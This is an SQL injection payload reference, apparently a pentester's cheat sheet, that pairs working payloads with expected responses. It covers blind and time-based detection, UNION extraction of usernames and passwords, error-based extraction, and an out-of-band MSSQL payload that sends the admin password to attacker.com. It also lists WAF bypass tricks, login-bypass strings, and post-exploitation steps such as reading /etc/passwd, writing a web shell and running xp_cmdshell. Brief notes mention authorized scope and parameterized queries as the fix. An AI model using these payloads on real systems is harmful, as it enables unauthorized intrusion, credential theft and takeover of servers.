# SQL Injection Reference —  [SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



---

**Payload sent:**
```
'
```
**Response observed:**
A single unescaped quote often breaks query syntax outright. Look for a `500` error, a stack trace, or a generic "database error" message — strong signal the input reaches a SQL query unsanitized.

---

**Payload sent (boolean-based blind):**
```
' AND 1=1 -- 
' AND 1=2 -- 
```
**Response observed:**
Send both and diff the responses. `1=1` should return the normal page; `1=2` should return something different (empty result, different length, different status). No visible difference on either = parameter likely not injectable, or filtered.

---

**Payload sent (time-based blind, MySQL):**
```
' AND SLEEP(5)-- 
```
**Response observed:**
If the response takes ~5 seconds longer than baseline, the payload executed inside a real query — confirms blind injection even with no visible output difference.

## Database-Specific Syntax Cheat Sheet

| Goal | MySQL | PostgreSQL | MSSQL | Oracle |
|---|---|---|---|---|
| Comment rest of query | `-- ` or `#` | `-- ` | `-- ` | `-- ` |
| String concat | `CONCAT(a,b)` | `a \|\| b` | `a + b` | `a \|\| b` |
| Time delay | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_LOCK.SLEEP(5)` |
| Version | `@@version` | `version()` | `@@version` | `v$version` |
| Current DB | `database()` | `current_database()` | `DB_NAME()` | `SELECT name FROM v$database` |
| List tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Stacked queries | Rare (driver-dependent) | Supported | Supported | Not typical |
| Subquery in error | `extractvalue()`, `updatexml()` | n/a (use casting errors) | `CONVERT()` cast errors | `CTXSYS.DRITHSX.SN` |

## UNION-Based Extraction Walkthrough

**Step 1 — find column count:**
```
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```
Increment until you get an error — that tells you the column count (error = one too many).

**Step 2 — find which columns reflect in output:**
```
' UNION SELECT NULL,NULL,NULL-- 
```
Replace `NULL`s one at a time with a string (e.g. `'test'`) to identify which positions render in the visible response.

**Step 3 — pull real data:**
```
' UNION SELECT username, password, NULL FROM users-- 
```

## Error-Based Extraction (MySQL example)

**Payload sent:**
```
' AND extractvalue(1, concat(0x7e, (SELECT version()))) -- 
```
**Response observed:**
The `extractvalue()` function throws an XPATH syntax error and includes the subquery result (DB version string) directly in the error message — data exfiltrated via the error output itself.

## Out-of-Band Exfiltration (MSSQL example)

**Payload sent:**
```
'; EXEC master..xp_dirtree '//attacker.com/'+(SELECT password FROM users WHERE username='admin')+'/a'--
```
**Response observed:**
No visible change in the HTTP response, but the target server makes a DNS/SMB lookup to your listener with the extracted data embedded in the hostname — confirm via your DNS logging server (e.g. Burp Collaborator or a custom listener).

## WAF / Filter Bypass Techniques

| Technique | Example | Why it works |
|---|---|---|
| Case variation | `UnIoN sElEcT` | Bypasses naive case-sensitive keyword filters |
| Inline comments | `UNION/**/SELECT` | Defeats filters matching on whitespace-separated keywords |
| Encoding | `%55NION` (URL), or double URL-encoding | Bypasses filters that only decode once |
| Alternate whitespace | `UNION%0aSELECT` (newline instead of space) | Some parsers accept non-space whitespace that filters don't check |
| Logical operator swap | `OR` → `\|\|` (MySQL with PIPES_AS_CONCAT off) or `OR 1=1` → `OR true` | Evades keyword-specific blocklists |
| String concatenation to break keywords | `'UNI' + 'ON SELECT'` (DB-dependent) | Defeats static string matching on full keywords |
| Second-order injection | Store payload in a profile field, trigger via an unrelated feature that reads it back into a query | Bypasses WAF entirely since the injection point and execution point are different requests |

## Authentication Bypass Payloads (classic, for login forms)

```
admin' -- 
admin' #
' OR 1=1-- 
' OR ''='
```
These aim to either comment out the password check entirely or make the WHERE clause always evaluate true.

## Post-Exploitation Once Injection Is Confirmed

- **Enumerate**: DB version, current user, current DB, privilege level (`SELECT user(), current_user(), @@version`).
- **Schema mapping**: pull table/column names from `information_schema` (or DB-specific equivalent) before targeting specific data.
- **Privilege escalation**: check for `FILE` privilege (MySQL `LOAD_FILE()`/`INTO OUTFILE`), `xp_cmdshell` (MSSQL), or `COPY ... TO PROGRAM` (PostgreSQL) for OS command execution.
- **Read/write files**: `LOAD_FILE('/etc/passwd')`, `SELECT ... INTO OUTFILE '/var/www/shell.php'` — file write can lead to full RCE if the path is web-accessible.
- **Pivot**: stacked queries or `xp_cmdshell` can be a foothold into the underlying host, not just the DB.

## Tooling Note
Manual payloads are good for confirmation and understanding; for full enumeration use `sqlmap` (`--risk`/`--level` tuned to the engagement, `--technique` to target specific injection types) and Burp Suite's scanner/Intruder for parameter fuzzing at scale. Always stay within authorized scope — automated tools can generate significant load and write/delete data if used carelessly.

## Quick Notes
- Always test with a baseline (clean) request first so you have something to diff against for boolean/time-based detection.
- Parameterized queries / prepared statements are the actual fix — if you're writing a report, that's the recommendation, not just "sanitize input."
- ORMs reduce but don't eliminate risk — raw query building or string-concatenated filters inside an ORM are still exploitable.
